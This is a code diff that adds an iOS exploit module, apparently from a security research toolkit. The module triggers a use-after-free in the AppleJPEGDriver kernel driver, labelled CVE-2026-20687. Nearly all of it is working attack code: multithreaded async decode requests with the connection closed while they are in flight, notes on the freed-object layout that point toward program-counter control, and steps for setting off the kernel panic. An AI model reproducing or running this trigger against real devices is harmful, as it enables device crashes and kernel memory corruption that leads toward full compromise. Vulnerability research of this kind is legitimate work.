@@ -68,10 +68,159 @@ extern IOSurfaceRef_ IOSurfaceCreate(CFDictionaryRef dictionary);
 extern uint32_t IOSurfaceGetID(IOSurfaceRef_ buffer);
 extern void IOSurfaceSetValue(IOSurfaceRef_, CFStringRef, CFTypeRef);
 extern size_t IOSurfaceGetAllocSize(IOSurfaceRef_ buffer);
+extern int IOSurfaceLock(IOSurfaceRef_, uint32_t, uint32_t *);
+extern int IOSurfaceUnlock(IOSurfaceRef_, uint32_t, uint32_t *);
+extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
 #define kIOSurfaceWidth  CFSTR("IOSurfaceWidth")
 #define kIOSurfaceHeight CFSTR("IOSurfaceHeight")
 #define kIOSurfaceBytesPerElement CFSTR("IOSurfaceBytesPerElement")
 #define kIOSurfaceBytesPerRow CFSTR("IOSurfaceBytesPerRow")
+#define kIOSurfacePixelFormat CFSTR("IOSurfacePixelFormat")
+
+// ===========================================================================
+// 4. CVE-2026-20687 port: AppleJPEGDriver startDecoder() timeout UAF
+//    Public PoC: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
+//    (validated by Mallory; tested on A19 / iOS 26.3).  FIXED IN 26.4 - our
+//    23C5027f (26.2b1) is VULNERABLE.  Apple's own text: "An app may be able
+//    to cause unexpected system termination or WRITE KERNEL MEMORY".
+//
+//    Shape (from the PoC's disassembly notes):
+//      selector 1 = decode, structIn = structOut = 0x58 (AppleJPEGDriverIOStruct)
+//      asyncToken != 0  => async mode => the request node (req+0x78) is pushed
+//      into the per-codec vector at driver self+192; closing the client with
+//      requests in flight frees the JpegRequest (0x440 bytes) WITHOUT
+//      dequeuing; a later queue walk (finish_io_gated -> fullSpeedRequestExist)
+//      reads the stale node: req2 = *(node+8) -> UAF.  req+0x00 is a task_t,
+//      so a vtable-style deref of it is PC control.
+//    This module drives exactly that shape (8 threads x iters x 10 async
+//    requests, close under flight) and reports the wired-memory delta and
+//    every return code.  The deferred panic usually needs one sync decode
+//    afterwards (the PoC uses the Camera app).
+// ===========================================================================
+typedef struct __attribute__((packed)) {
+    uint32_t sourceID;      // +0x00 source IOSurface id (JPEG bytes)
+    uint32_t field_04;      // +0x04 input size
+    uint32_t destID;        // +0x08 dest IOSurface id
+    uint32_t field_0C;      // +0x0C output size
+    uint32_t field_10;      // +0x10
+    uint32_t width;         // +0x14
+    uint32_t height;        // +0x18
+    uint32_t field_1C;      // +0x1C
+    uint8_t  flags;         // +0x20 bit0=progressive
+    uint8_t  pad_21[3];
+    uint32_t xOffset;       // +0x24
+    uint32_t yOffset;       // +0x28
+    uint32_t subsampling;   // +0x2C
+    uint64_t asyncToken;    // +0x30 non-zero = ASYNC (the UAF window)
+    uint64_t asyncToken2;   // +0x38
+    uint64_t field_40;      // +0x40
+    uint32_t codecID;       // +0x48
+    uint32_t outWidth;      // +0x4C
+    uint32_t outHeight;     // +0x50
+    uint32_t field_54;      // +0x54
+} RSJpegIn;
+
+static io_service_t rs_jpeg_service(void) {
+    CFMutableDictionaryRef m = IOServiceMatching("AppleJPEGDriver");
+    if (!m) return 0;
+    io_iterator_t it = 0;
+    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it) return 0;
+    io_service_t s = IOIteratorNext(it);
+    IOObjectRelease(it);
+    return s;
+}
+
+static int64_t rs_wired_pages(void) {
+    host_name_port_t host = mach_host_self();
+    vm_statistics64_data_t vm;
+    mach_msg_type_number_t n = HOST_VM_INFO64_COUNT;
+    if (host_statistics64(host, HOST_VM_INFO64, (host_info64_t)&vm, &n) != KERN_SUCCESS) return -1;
+    return (int64_t)vm.wire_count;
+}
+
+NSString *ModJpegUAF(void) {
+    AveLog(@"[jpeg20687] === CVE-2026-20687: AppleJPEGDriver startDecoder timeout UAF (public PoC port) ===");
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    // a real JPEG (the driver wants plausible input)
+    const int W = 1024, H = 1024;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    if (!jpeg) { IOObjectRelease(svc); return @"jpeg encode failed"; }
+
+    // source surface: raw bytes, page-aligned
+    size_t allocLen = (jpeg.length + 0x3FFF) & ~(size_t)0x3FFF;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    if (!src || !dst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        IOObjectRelease(svc);
+        return @"surface creation failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+    AveLog(S(@"[jpeg20687] src=%u dst=%u jpeg=%zuB %dx%d", srcID, dstID, jpeg.length, W, H));
+
+    int64_t wired0 = rs_wired_pages();
+    AveLog(S(@"[jpeg20687] wired before: %lld pages", wired0));
+
+    // 8 threads x iters x 10 async requests, close under flight
+    const int THREADS = 8, REQS = 10, ITERS = 40;
+    __block volatile int32_t totalSubmitted = 0, totalConn = 0;
+    __block kern_return_t lastKR = 0;
+    dispatch_group_t group = dispatch_group_create();
+    for (int t = 0; t < THREADS; t++) {
+        dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+            for (int i = 0; i < ITERS; i++) {
+                io_connect_t conn = 0;
+                if (IOServiceOpen(svc, mach_task_self(), 0, &conn) != KERN_SUCCESS || !conn) continue;
+                int submitted = 0;
+                for (int j = 0; j < REQS; j++) {
+                    RSJpegIn in; memset(&in, 0, sizeof in);
+                    in.sourceID = srcID; in.destID = dstID;
+                    in.field_04 = (uint32_t)jpeg.length; in.field_0C = W * H * 4;
+                    in.width = W; in.height = H; in.outWidth = W; in.outHeight = H;
+                    in.subsampling = 3;
+                    in.asyncToken = 0x4141 + j;      // non-zero = async mode
+                    RSJpegIn out; memset(&out, 0, sizeof out);
+                    size_t outSz = sizeof out;
+                    kern_return_t kr = IOConnectCallStructMethod(conn, 1, &in, sizeof in,
+                                                                &out, &outSz);
+                    lastKR = kr;
+                    if (kr != KERN_SUCCESS) break;
+                    submitted++;
+                }
+                IOServiceClose(conn);                // close with requests in flight
+                __sync_fetch_and_add(&totalSubmitted, submitted);
+                __sync_fetch_and_add(&totalConn, 1);
+            }
+        });
+    }
+    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);
+    usleep(500000);
+
+    int64_t wired1 = rs_wired_pages();
+    AveLog(S(@"[jpeg20687] connections=%d submitted=%d lastKR=%#x", totalConn, totalSubmitted, lastKR));
+    AveLog(S(@"[jpeg20687] wired delta: %+lld pages (the JpegRequest leak)", wired1 - wired0));
+    AveLog(@"[jpeg20687] deferred panic: run one SYNC decode now (open Camera or decode a JPEG)");
+
+    CFRelease(src); CFRelease(dst); IOObjectRelease(svc);
+    AveSetStatus(@"20687 trigger done - see the log");
+    return S(@"20687: %d conns, %d async decodes, wired %+lld pages; a sync decode next = the deferred panic",
+              totalConn, totalSubmitted, wired1 - wired0);
+}
 
 // ===========================================================================
 // 1. CVE-2026-64788 oracle
